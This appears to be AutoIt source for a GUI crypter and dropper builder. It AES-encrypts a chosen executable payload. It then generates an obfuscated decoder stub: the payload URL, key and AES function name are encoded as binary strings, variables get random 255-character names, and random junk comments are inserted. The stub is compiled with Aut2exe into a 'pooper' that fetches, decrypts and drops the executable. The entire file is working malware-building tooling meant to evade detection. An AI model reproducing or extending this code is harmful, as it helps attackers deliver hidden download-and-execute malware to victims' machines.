#include <form.au3>
#include <Array.au3>
#include "../lib/AES.au3"

Global Const $CHR_AZ_LOW        = StringLower("abcdefghijklmnopqrstuvwxyz")
Global Const $CHR_AZ_UP        = StringUpper("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
Global Const $CHR_NUMBERS    = "0123456789"

GUISetState(@SW_SHOW)
_GUICtrlTab_ClickTab($Tab1, 0)
$bin = StringToBinary("test test test etst test")
;msgbox(0,"",$bin)

While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $GUI_EVENT_CLOSE
			Exit
		Case $btnPayloadBrowse
			$outputFile = FileOpenDialog ( "Select payload", @DocumentsCommonDir, "Executables (*.exe)" )
			if $outputFile <> "" Then
				ControlSetText("", "", $txtPayload, $outputFile)
			EndIf
		Case $btnOutputBrowse
			$outputDir = FileSelectFolder ( "Select output directory", "C:\")
			if $outputDir <> "" Then
				ControlSetText("", "", $txtOutput, $outputDir)
			EndIf
		Case $btnMakeItSo
			encodePayload()

		;;;;; Generate Pooper Events
		Case $btnPOutputBrowse
			$outputDir = FileSelectFolder ( "Select pooper output directory", "C:\")
			if $outputDir <> "" Then
				ControlSetText("", "", $txtPOutput, $outputDir)
			EndIf
		Case $btnAU3WrapperBrowse
		Case $btnPooperGen
			generatePooperPlox()
	EndSwitch
WEnd

func encodePayload()
	$key = ControlGetText("", "", $txtAES)
	$payload  = ControlGetText("", "", $txtPayload)
	$output = ControlGetText("", "", $txtOutput)

	if $key == "" then
		msgbox(0+16, "fail", "No AES key.")
		return 0
	EndIf

	if $payload == "" then
		msgbox(0+16, "fail", "No payload defined.")
		return 0
	EndIf

	if $output == "" then
		msgbox(0+16, "fail", "No output directory defined.")
		return 0
	EndIf

	if Not FileExists($payload) then
		msgbox(0+16, "fail", "Payload file does not exist.")
		return 0
	EndIf

	if Not FileExists($output) then
		msgbox(0+16, "fail", "Output directory does not exist.")
		return 0
	EndIf

	$filename = StringRegExpReplace($payload, '^.*\\', '')
	$extA = StringSplit($filename, ".")
	$ext = $extA[UBound($extA)-1]

	_ArrayPop($extA)
	$filenoext = _ArrayToString($extA, ".", 1)

	$output = $output & "\" & $filenoext & ".enc"

	consolewrite($output)

	_AesEncryptFile($key,  $payload, $output, "CFB")

	$begin = TimerInit()
	While TimerDiff($begin) < 30000
		 If FileExists($output) then
			 ;insert code
			 msgbox(0, "*ding*", "Payload written: " & $output)
			 return 0
		 EndIf
	 WEnd

	 msgbox(0+16, "fail", "Error writing: " & $output)

EndFunc

Func generatePooperPlox()
	$key = ControlGetText("", "", $txtPAES)
	$payloadurl  = ControlGetText("", "", $txtEncPayloadURL)
	$output = ControlGetText("", "", $txtPOutput)
	$pooperFilename = ControlGetText("", "", $txtPooperFilename)
	$finalExe = ControlGetText("", "", $txtFinalExe)
	$aut2exe = ControlGetText("", "", $txtAU3Wrapper)

	$temp1 = "00000.bin"
	$temp2 = "00001.bin"

	$dec = FileRead("..\lib\dec_template.txt")

	$b2s = _GenerateVarName(255, $CHR_AZ_LOW & $CHR_AZ_UP & $CHR_NUMBERS)
	$dec = StringReplace($dec, "%%b2s%%", $b2s)
	$dec = StringReplace($dec, "%%url%%", $b2s & "('" & StringToBinary($payloadurl) & "')")
	$dec = StringReplace($dec, "\%%exeFile%%", $b2s & "('" & StringToBinary("\" & $finalExe) & "')")
	$dec = StringReplace($dec, "\%%temp1%%", $b2s & "('" & StringToBinary("\" & $temp1) & "')")
	$dec = StringReplace($dec, "\%%temp2%%", $b2s & "('" & StringToBinary("\" & $temp2) & "')")
	$dec = StringReplace($dec, "%%key%%", $b2s & "('" & StringToBinary($key) & "')")
	$dec = StringReplace($dec, "%%aesfunc%%", $b2s & "('0x5F4165734465637279707446696C65')")

	$dec = StringReplace($dec, "$serverFile", "$" & _GenerateVarName(255, $CHR_AZ_LOW & $CHR_AZ_UP & $CHR_NUMBERS))
	$dec = StringReplace($dec, "$tmpEncFile", "$" & _GenerateVarName(255, $CHR_AZ_LOW & $CHR_AZ_UP & $CHR_NUMBERS))
	$dec = StringReplace($dec, "$tmpFile2", "$" & _GenerateVarName(255, $CHR_AZ_LOW & $CHR_AZ_UP & $CHR_NUMBERS))
	$dec = StringReplace($dec, "$exeFile", "$" & _GenerateVarName(255, $CHR_AZ_LOW & $CHR_AZ_UP & $CHR_NUMBERS))
	$dec = StringReplace($dec, "$sData", "$" & _GenerateVarName(255, $CHR_AZ_LOW & $CHR_AZ_UP & $CHR_NUMBERS))
	$dec = StringReplace($dec, "$newFile", "$" & _GenerateVarName(255, $CHR_AZ_LOW & $CHR_AZ_UP & $CHR_NUMBERS))
	$dec = StringReplace($dec, "$binary", "$" & _GenerateVarName(255, $CHR_AZ_LOW & $CHR_AZ_UP & $CHR_NUMBERS))

	while(StringInStr($dec, ";;;;;")>0)
		$dec = StringReplace($dec, ";;;;;", _GenerateNonsense(), 1)
	WEnd

	if FileExists("..\lib\obf_dec.au3") Then
		FileDelete("..\lib\obf_dec.au3")
	EndIf

	consolewrite("write: " & FileWrite("..\lib\obf_dec.au3", $dec))

	$begin = TimerInit()
	While TimerDiff($begin) < 30000
		 If FileExists("..\lib\obf_dec.au3") then

			ExitLoop

		 EndIf
	 WEnd

	$p0 = "/in """ & @ScriptDir & "\..\lib\obf_dec.au3"""
	$p1 = " /out """ & $output & "\" & $pooperFilename & """"
	$p2 = " /x86"
	ShellExecute($aut2exe,  $p0 & $p1 & $p2)

	$begin = TimerInit()
	While TimerDiff($begin) < 30000
		 If FileExists($output & "\" & $pooperFilename) then
			msgbox(1, 'winrar', 'Brand new pooper is here: ' & $output & "\" & $pooperFilename)
			return 0

		 EndIf
	 WEnd

EndFunc

Func _GenerateVarName($iLength, $sSequence)
    Local $sResult
    Local $aSplit = StringSplit($sSequence, "", 2)
	$sResult = 'a'
    For $i = 1 To $iLength
        $sResult &= $aSplit[Random(0, UBound($aSplit) - 1, 1)]
    Next

    Return $sResult
EndFunc

Func _GenerateNonsense()
	Local $sResult = ';'
    For $i = 1 To Random(50, 1000)
        $sResult &= Chr(Random(32, 255))
    Next

    Return $sResult
EndFunc